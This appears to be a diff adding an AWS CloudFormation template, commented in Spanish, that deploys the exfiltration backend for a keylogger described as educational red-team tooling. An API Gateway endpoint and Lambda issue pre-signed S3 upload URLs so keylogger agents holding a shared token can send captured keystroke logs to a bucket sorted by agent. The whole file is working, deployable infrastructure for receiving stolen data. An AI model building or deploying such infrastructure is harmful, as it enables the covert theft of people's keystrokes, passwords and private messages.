@@ -1,0 +1,206 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: >
+  Backend de exfiltracion para keylogger educativo (red team).
+  API Gateway + Lambda emite pre-signed URLs PUT hacia S3.
+  El agente jamas recibe credenciales IAM.
+
+Parameters:
+  SharedToken:
+    Type: String
+    NoEcho: true
+    MinLength: 16
+    Description: Secreto compartido. El agente lo envia en el header x-api-key. Mismo valor se usa como API key de API Gateway.
+  UrlExpires:
+    Type: Number
+    Default: 120
+    MinValue: 30
+    MaxValue: 900
+    Description: Segundos de validez de cada pre-signed URL.
+  LogPrefix:
+    Type: String
+    Default: logs
+    Description: Prefijo (carpeta) dentro del bucket S3.
+  RetentionDays:
+    Type: Number
+    Default: 30
+    Description: Dias antes de que S3 elimine los logs automaticamente.
+  StageName:
+    Type: String
+    Default: prod
+    AllowedValues: [dev, prod]
+
+Resources:
+  LogBucket:
+    Type: AWS::S3::Bucket
+    DeletionPolicy: Retain
+    Properties:
+      BucketEncryption:
+        ServerSideEncryptionConfiguration:
+          - ServerSideEncryptionByDefault:
+              SSEAlgorithm: AES256
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: true
+        BlockPublicPolicy: true
+        IgnorePublicAcls: true
+        RestrictPublicBuckets: true
+      LifecycleConfiguration:
+        Rules:
+          - Id: ExpireOldLogs
+            Status: Enabled
+            ExpirationInDays: !Ref RetentionDays
+
+  UrlFunctionRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: PutObjectOnly
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Effect: Allow
+                Action: s3:PutObject
+                Resource: !Sub arn:${AWS::Partition}:s3:::${LogBucket}/${LogPrefix}/*
+              - Effect: Allow
+                Action:
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: arn:aws:logs:*:*:*
+
+  UrlFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt UrlFunctionRole.Arn
+      Environment:
+        Variables:
+          BUCKET_NAME: !Ref LogBucket
+          SHARED_TOKEN: !Ref SharedToken
+          URL_EXPIRES: !Ref UrlExpires
+          LOG_PREFIX: !Ref LogPrefix
+      Code:
+        ZipFile: |
+          import json
+          import os
+          import re
+          from datetime import datetime, timezone
+
+          import boto3
+
+
+          def handler(event, context):
+              headers = event.get("headers") or {}
+              if headers.get("x-api-key", "") != os.environ["SHARED_TOKEN"]:
+                  return {"statusCode": 403, "body": json.dumps({"error": "forbidden"})}
+
+              try:
+                  body = json.loads(event.get("body") or "{}")
+              except (json.JSONDecodeError, TypeError):
+                  body = {}
+
+              agent_id = re.sub(r"[^A-Za-z0-9_-]", "", str(body.get("agent_id", "")))[:32] or "unknown"
+              timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
+              key = f"{os.environ['LOG_PREFIX']}/{agent_id}/{agent_id}_{timestamp}.txt"
+
+              s3_client = boto3.client("s3")
+              upload_url = s3_client.generate_presigned_url(
+                  "put_object",
+                  Params={
+                      "Bucket": os.environ["BUCKET_NAME"],
+                      "Key": key,
+                      "ContentType": "text/plain",
+                  },
+                  ExpiresIn=int(os.environ["URL_EXPIRES"]),
+                  HttpMethod="PUT",
+              )
+
+              return {
+                  "statusCode": 200,
+                  "headers": {"Content-Type": "application/json"},
+                  "body": json.dumps({"upload_url": upload_url, "key": key}),
+              }
+
+  KeyLoggerApi:
+    Type: AWS::ApiGateway::RestApi
+    Properties:
+      Name: !Sub keylogger-upload-${AWS::StackName}
+      ApiKeySourceType: HEADER
+      EndpointConfiguration:
+        Types: [REGIONAL]
+
+  UrlResource:
+    Type: AWS::ApiGateway::Resource
+    Properties:
+      RestApiId: !Ref KeyLoggerApi
+      ParentId: !GetAtt KeyLoggerApi.RootResourceId
+      PathPart: url
+
+  UrlMethod:
+    Type: AWS::ApiGateway::Method
+    Properties:
+      RestApiId: !Ref KeyLoggerApi
+      ResourceId: !Ref UrlResource
+      HttpMethod: POST
+      AuthorizationType: NONE
+      ApiKeyRequired: true
+      Integration:
+        Type: AWS_PROXY
+        IntegrationHttpMethod: POST
+        Uri: !Sub arn:${AWS::Partition}:apigateway:${AWS::Region}:lambda:path/2015-03-31/functions/${UrlFunction.Arn}/invocations
+
+  ApiDeployment:
+    Type: AWS::ApiGateway::Deployment
+    DependsOn: UrlMethod
+    Properties:
+      RestApiId: !Ref KeyLoggerApi
+      StageName: !Ref StageName
+
+  ApiKey:
+    Type: AWS::ApiGateway::ApiKey
+    Properties:
+      Name: !Sub keylogger-key-${AWS::StackName}
+      Enabled: true
+      Value: !Ref SharedToken
+
+  UsagePlan:
+    Type: AWS::ApiGateway::UsagePlan
+    DependsOn: ApiDeployment
+    Properties:
+      UsagePlanName: !Sub keylogger-plan-${AWS::StackName}
+      ApiStages:
+        - ApiId: !Ref KeyLoggerApi
+          Stage: !Ref StageName
+
+  UsagePlanKey:
+    Type: AWS::ApiGateway::UsagePlanKey
+    Properties:
+      UsagePlanId: !Ref UsagePlan
+      KeyId: !Ref ApiKey
+      KeyType: API_KEY
+
+  LambdaPermission:
+    Type: AWS::Lambda::Permission
+    Properties:
+      Action: lambda:InvokeFunction
+      FunctionName: !Ref UrlFunction
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub arn:${AWS::Partition}:execute-api:${AWS::Region}:${AWS::AccountId}:${KeyLoggerApi}/*/POST/url
+
+Outputs:
+  ApiEndpoint:
+    Description: URL base del endpoint de subida (POST /url).
+    Value: !Sub https://${KeyLoggerApi}.execute-api.${AWS::Region}.${AWS::URLSuffix}/${StageName}
+  BucketName:
+    Description: Bucket S3 donde se almacenan los logs.
+    Value: !Ref LogBucket
+  SharedToken:
+    Description: Secreto compartido configurado (no se imprime el valor, solo confirmacion).
+    Value: !Sub configurado (${AWS::StackName})
